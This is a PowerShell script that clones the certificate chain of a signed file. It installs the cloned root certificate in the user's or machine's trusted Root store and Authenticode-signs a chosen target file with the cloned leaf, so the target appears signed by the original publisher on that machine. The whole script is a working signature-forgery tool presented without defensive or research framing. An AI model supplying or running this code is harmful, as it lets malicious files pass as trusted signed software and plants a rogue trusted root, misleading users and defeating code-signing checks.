param([Parameter(Mandatory=$true)] [String]$OriginalFile,
      [Parameter(Mandatory=$true)] [String]$TargetFile,
      [switch]$LocalMachine)

# Setup Cert Store in Reg
$CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }
# Setup Cert Store on Disk
$certificates = .\Enumerate-Certificates.ps1 $OriginalFile
#Get-ChildItem -Path "cert:\CurrentUser\My | ?{$_.Subject -eq "CN=TodoListDaemonWithCert"}
#[system.io.directory]::CreateDirectory(".\CertStore")
# Save each certificate to disk
$imported = $false
$orig_cert = $null
$cloned_cert = $null
For($i = $certificates.Length - 1; $i -gt 0; $i--)
{
    $c = $certificates[$i].Certificate;
    $t = $c.Thumbprint;
    [byte[]]$cer = $c.Export('Cert');
    Set-Content -Path ".\$t.cer" -Value $cer -Encoding Byte
    $orig_cert = Get-PfxCertificate -FilePath ".\$t.cer"
    if($imported -ne $true)
    {
        # no signer for root CA
        $cloned_cert = New-SelfSignedCertificate -CloneCert $orig_cert @CertStoreLocation
    }
    else {
        $cloned_cert = New-SelfSignedCertificate -CloneCert $orig_cert -Signer $previous_cert @CertStoreLocation
    }
    $previous_cert = $cloned_cert
    if($imported -ne $true)
    {
        Export-Certificate -Type CERT -FilePath ".\$t.cer" -Cert $cloned_cert
        if($localmachine) {
            # Import in the local machine's CA store
            Import-Certificate -FilePath ".\$t.cer" -CertStoreLocation cert:\LocalMachine\Root\
        } else {
            # Import in the current user's CA store
            Import-Certificate -FilePath ".\$t.cer" -CertStoreLocation cert:\CurrentUser\Root\
        }
        $imported = $true
    }
    Remove-Item -Path ".\$t.cer" # Not needed anymore, cleaning up
}

Set-AuthenticodeSignature -Certificate $cloned_cert -FilePath $TargetFile

Get-AuthenticodeSignature -FilePath $TargetFile # print results